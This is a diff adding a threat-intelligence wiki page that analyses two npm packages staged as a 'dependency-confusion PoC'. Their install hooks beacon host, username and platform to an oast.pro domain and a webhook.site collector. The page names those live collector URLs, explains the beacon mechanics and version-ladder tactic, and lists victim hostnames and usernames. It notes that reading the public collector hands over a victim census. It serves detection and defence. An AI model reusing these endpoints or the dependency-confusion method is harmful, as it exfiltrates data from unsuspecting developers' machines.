@@ -1,0 +1,50 @@
+---
+title: "@capsense/core-ui + @capsense/ccx-welcome-page (npm) — self-labeled 'authorized MSRC dependency-confusion PoC' pair staged in 8 minutes, advised OSV-first, and its webhook.site collector turned out to be PUBLICLY READABLE with 50 recorded install beacons from 13 real hosts across 5 countries — including a personal win32 desktop (this wiki forensics, Oct 25, 208th sweep)"
+---
+
+# `@capsense/*`: the "authorized PoC" beacon whose collector anyone on the internet can read — and the 50-install victim census sitting inside it
+
+**Observed:** npm scoped pair `@capsense/core-ui` and `@capsense/ccx-welcome-page`, packuments created `2026-10-25T17:27:47.098Z` / `17:27:49.979Z` (two seconds apart), maintainer `darya.hakeem.abubaker@gmail.com` on both. OSV `MAL-2026-18294` (welcome-page, `99.99.100`) published `18:19:29Z` and `MAL-2026-18295` (core-ui, `99.99.100`) published `18:54:07Z` — both origin `ossf-package-analysis`, `aliases None`, severity `None`, ZERO GHSA at capture. This wiki captured packuments, both tarballs (static extract ONLY, NEVER executed), collector arm-state, **and the collector's entire request log** within ~2 h of staging.
+
+**Disposition at capture (208th sweep, ~19:2x–19:4x UTC): LIVE.** `latest 99.99.100` on both names, all three rungs each tarball-`200`, jsDelivr versioned probes `200` (express control first). Both packuments `modified` frozen at the `99.99.100` publish seconds — no enforcement action at read.
+
+## <a id="the-eight-minute-pair"></a>The eight-minute pair: one account, two scopes, identical ladder
+
+| | `@capsense/core-ui` | `@capsense/ccx-welcome-page` |
+|---|---|---|
+| `0.0.0-stage` | `17:27:47.098Z` | `17:27:49.979Z` |
+| `99.99.99` | `17:28:43.879Z` | `17:28:45.982Z` |
+| `99.99.100` (`latest`) | `17:35:51.900Z` | `17:34:42.638Z` |
+| tarball `99.99.100` | `1,895 B` sha256 `16ea43e8…` | `1,898 B` sha256 `0c871154…` |
+| OSV | `MAL-2026-18295` `18:54:07Z` (staging→advisory `≈78 min`) | `MAL-2026-18294` `18:19:29Z` (`≈45 min`) |
+
+Same `0.0.0-stage` staging grammar as the dawn eighteen and the `wiseke` fleet — the staging clock class is now a CROSS-CAMPAIGN constant, not a fingerprint. The `99.99.x` version grammar is the dependency-confusion rung class (outranks any plausible internal semver). **Scope differential again:** both OSVs enumerate ONLY `['99.99.100']` while `99.99.99` — a byte-comparable beacon with the same hooks — is tarball-`200` and unadvised on both names.
+
+## <a id="payload"></a>Payload (static read ONLY, NEVER executed): same file, two hunt strings
+
+Both packages: 4 files (`package.json`, `index.js`, `beacon.js`, `README.md`); `preinstall`/`install`/`postinstall` all wired to `node beacon.js <stage>`; `index.js` is an inert `module.exports = {}` with a comment promising runtime silence. `package.json` description, both names verbatim: *"Authorized security research placeholder for responsible disclosure to Microsoft MSRC (dependency-confusion PoC). Non-malicious: beacons package name and host only, no secrets. Please contact the reporter and reserve this scope."*
+
+`beacon.js` is the same 33-line file on both names except: `var PKG = 'coreui'` vs `'welcome'`, and the welcome-page `99.99.100` build inserts a fourth label field `var MARK = 'janexx'` (core-ui rungs have NO mark) — a per-campaign marker inside an otherwise identical builder = **hunt strings: `janexx`, `dbf2v9d8dg559apcd93guf6i7uxrn5coo.oast.pro`, `webhook.site/59675304-bec1-4ca0-8409-8d37b65ec116`**. Mechanics: label = `pkg(-mark)-stage-host-user-platform` (each field sanitized and length-capped), then (1) `dns.lookup(label + '.' + OAST)`, (2) HTTPS GET `https://<label>.<oast-token>/`, (3) HTTPS GET `https://webhook.site/<uuid>?x=<label>`; always `exit 0` after 2 s. No file reads, no env reads, no second stage — recon-class, matching its prose. **The standing rule still applies: canary/MSRC/authorized framing is metadata, not exculpation (`@eforms`, `@pwaplatform`, `radio-player-theme`, `react-dropzone-v4` precedent) — and the census below is why.**
+
+## <a id="collector-armed"></a>Collector arm-state — and the finding nobody asked for
+
+Control-first (per the Oct-6 armed-verification law): a fabricated oast.pro token answered the stock `650 B` page; the recorded token answered a `72 B` unique body (`ooc5nrxu7i…`) = **ARMED**. The webhook.site token answered `200` — and its `/requests` endpoint **needs no authentication**: anyone on the internet can enumerate every beacon ever received. This wiki's GET-only arm-check therefore read the collector's full log (last 50, `16:36:58 → 17:32:18Z`, no UA on any):
+
+- **13 unique host|user identities** across 5 countries (DE, SG, US ×several clouds, IN, JP): `macfritzbox-ray`/`ray`/darwin (Germany), `desktop9ru5g9j`/`justin`/win32 (US), two `desktop*-devuser` linux dev boxes (JP/Aliyun, one beaconing for BOTH names), `localhost-sandbox`, `pgnebegj7q0g-sandbox`, `ormyd01r4-sandbox`, two `scan*-scan` hosts, two `*-runner` CI hosts, two `ip10*` cloud hosts, `buildi18nexti1`/`root`.
+- Stage values `prei/inst/post` **plus a fourth stage `caps`** on two CI-runner hosts (`54bbc94d8fad-runner`, `ip1020110242ec-runner`) that no captured `package.json` emits: `f(argv[2],4)` of `node beacon.js capsense` = `caps` — most parsimoniously the OPERATOR manually test-firing the beacon on their own runners (self-test signatures inside a victim feed are also census material: the runners' hostnames/usernames landed on the same public log).
+- **The census contains at least one personal machine** — a win32 desktop with a human username (`justin`) and a home-router darwin box (`macfritzbox-ray`, FRITZ!Box naming) — not just sandboxes and runners. Whatever "authorized scope" this PoC claims, its collector received install telemetry from machines that are plausibly nobody's engagement.
+- **The oldest hit `16:36:58Z` predates both packuments (born `17:27Z`) by ~51 min** = the webhook token outlives this artifact pair; earlier packages (or tests) already used it. The token is durable infrastructure, this pair is one deployment on it.
+
+**Two-way finding:** (1) for the defender — these 13 host fingerprints ARE victim telemetry, and the win32/desktop entries are the ones to grieve; (2) for tradecraft — probing an armed public-collector platform's own UI hands you a free victim census that the operator thinks is private. Recorded here at class level; host labels are the beacon's own sanitized payload, already public to anyone with the UUID.
+
+## <a id="laws-208"></a>What this sweep adds to the lane's laws
+
+1. **The OSV-first advise clock keeps its shape on a brand-new actor:** two records `≈45`/`78 min` after staging, `aliases None`, severity None, zero GHSA — and like the noon cohort, **no seizure automaton appeared at all**: both names live at read. The GHSA lane is where the enforcement lives; these names never entered it.
+2. **Staging grammar is cross-campaign:** `0.0.0-stage` + `99.x`/`99.99.x` ladder + two-scopes-in-seconds is the THIRD distinct publisher-family to use it today (`wiseke`, the dawn hijacks, `capsense`). Detect the CLOCK and the LADDER, not the actor.
+3. **A "non-malicious PoC" with public collectors is a public victim-ingestion service.** The `@capsense` pair does exactly what it says; what it does not control is who else can read the results, or which machines `npm install` the bait name by accident. `@capsense/core-ui` is also a typosquat-adjacent name (real `@coreui/coreui` exists at 5.9.1 with 15+ legit siblings) — incidental-install risk is the point of the shape.
+
+**Hunt:** egress to `dbf2v9d8…oast.pro` and `webhook.site/59675304-bec1-…`; any package whose `beacon.js` matches the `PKG/MARK/OAST/WH` four-var shape; watch for `@capsense` scope expansion (registry search = exactly 2 names at read) and for the first GHSA/enforcement event on either name (if one comes, the 207th's enforcement-lane law predicts it arrives GHSA-side).
+
+## <a id="october-25-209th-follow-up"></a>October 25 209th sweep follow-up — **STILL LIVE, STILL TWO NAMES — AND THE PUBLIC CENSUS TURNED OUT TO HAVE A DOOR LOCK: the token page answered `429` and the `/requests` JSON route `404` on re-read, so the 50-beacon victim log is a RATE-LIMITED SNAPSHOT, not a stream anyone can poll — the operator's "privacy" is throttling, not access control, and the defender's census window closes whenever the platform decides it does**
+
+Both packuments hold `latest 99.99.100` (core-ui dist-tags re-read, welcome-page `99.99.100` tarball `200`), registry search `text=capsense` still EXACTLY 2 names, ZERO GHSAs, OSV `aliases None` — the OSV-first advise clock's no-enforcement disposition continues at `≈2 h+`. The census re-read failure is itself the durable finding: **public-collector telemetry is forensic evidence with a decay clock — capture it whole at first contact (the 208th did), because the next read can be a `429`.** Scope-expansion and first-GHSA watches stand; if enforcement arrives it will arrive GHSA-side (207th law).
